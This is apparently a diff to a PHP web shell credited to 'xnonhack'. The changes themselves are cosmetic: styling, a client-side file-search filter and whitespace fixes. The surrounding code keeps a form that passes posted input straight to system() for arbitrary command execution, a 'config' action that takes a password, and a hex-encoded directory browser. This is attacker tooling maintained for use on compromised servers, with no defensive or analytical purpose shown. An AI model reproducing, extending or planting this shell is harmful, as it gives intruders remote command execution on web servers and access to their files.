@@ -134,6 +134,7 @@ if (!isset($_SESSION['login'])) {
     }
     div.center {
         background: #fff;
+        display: inline;
         overflow: hidden;
         height:500px;
         border-radius:0px 0px 5px 0px;
@@ -157,10 +158,12 @@ if (!isset($_SESSION['login'])) {
     }
     div.tool a.logout {
         background:#dc3545;
+        border:none;
         color: #fff;
     }
     div.tool a.logout:hover {
         background:#dd4a58;
+        border:none;
     }
     div.tool a {
         z-index: 0;
@@ -502,6 +505,11 @@ if (!isset($_SESSION['login'])) {
         height:390px;
         border: none;
         background: none;
+    }
+    input[type=text].search {
+        width:500px;
+        float: right;
+        margin-right:15px;
     }
     textarea::placeholder {
         color: red;
@@ -940,13 +948,22 @@ scrolltitle();
 }
 </script>
 <script>
-function myFunction() {
-  var x = document.getElementById("myTopnav");
-  if (x.className === "navbar") {
-    x.className += " responsive";
-  } else {
-    x.className = "navbar";
-  }
+function filterTable() {
+    var input, filter, table, tr, td, i;
+    input = document.getElementById("Input");
+    filter = input.value.toUpperCase();
+    table = document.getElementById("myTable");
+    tr = table.getElementsByTagName("tr");
+    for (i = 0; i < tr.length; i++) {
+        td = tr[i].getElementsByTagName("td")[0];
+        if (td) {
+            if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
+                tr[i].style.display = "";
+            } else {
+                tr[i].style.display = "none";
+            }
+        }
+    }
 }
 </script>
 <center>
@@ -961,6 +978,8 @@ function myFunction() {
                         <span class="author">xnonhack</span>
                     </a>
                 </span>
+                <input class="search" type="text" id="Input" onkeyup="filterTable()" placeholder="Search for file.." title="Type in a name">
+                <noscript><style>#Input{display:none}</style></noscript>
             </div>
         </div>
     </div>
@@ -1214,8 +1233,8 @@ function myFunction() {
             }
         }
         public static function OS() {
-        	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
-		}
+            return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+        }
         public static function info($info = null) {
             switch ($info) {
                 case 'hdd':
@@ -1351,7 +1370,7 @@ function myFunction() {
                                     ?>
                                     <tr>
                                         <td>
-                                            <textarea style="height:330px;" readonly><?= system($_POST['command']) ?></textarea>
+                                            <textarea style="height:265px;" readonly><?= system($_POST['command']) ?></textarea>
                                         </td>
                                     </tr>
                                     <?php
@@ -1363,7 +1382,7 @@ function myFunction() {
                     <?php
                     break;
                 case 'config':
-                	if(x::OS() == "Windows") die(print("<script>alert('Just for windows server')</script>"));
+                    if(x::OS() == "Windows") die(print("<script>alert('Just for windows server')</script>"));
                     if (isset($_POST['submit'])) {
                         if (self::config($_POST['passwd'])) {
                             print("success");
@@ -1858,19 +1877,12 @@ function myFunction() {
                 ?>
                 <div class="files">
                     <div class="pwd">
-                        <?= x::pwd() ?> &nbsp; ( <?= x::w__(x::unhex($_GET['cd']), 'writable') ?> )
+                        <?= x::pwd() ?> &nbsp; ( <?= x::w__(getcwd(), 'writable') ?> )
                     </div>
                     <div class="infiles">
-                <table width="100%">
+                <table width="100%" id="myTable">
                 <?php
                 foreach (x::files('dir') as $dir) {
-                    $rp = str_replace($search , '', basename($dir['name']));
-                    $dirs = basename($dir['name']);
-                    if (strlen($dirs) > 29){
-                        $_dir = substr($dirs, 0, 29)."...";
-                    } else {
-                        $_dir = $dirs;
-                    }
                     ?>
                     <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                         <tr>
@@ -1882,7 +1894,7 @@ function myFunction() {
                                         </div>
                                         <div class="name">
                                             <div class="file">
-                                                <?= basename($_dir) ?>
+                                                <?= x::sortname(1, $dir['name']) ?>
                                             </div>
                                             <div class="date">
                                                 <?= $dir['size'] ?>&nbsp;&nbsp;&nbsp;
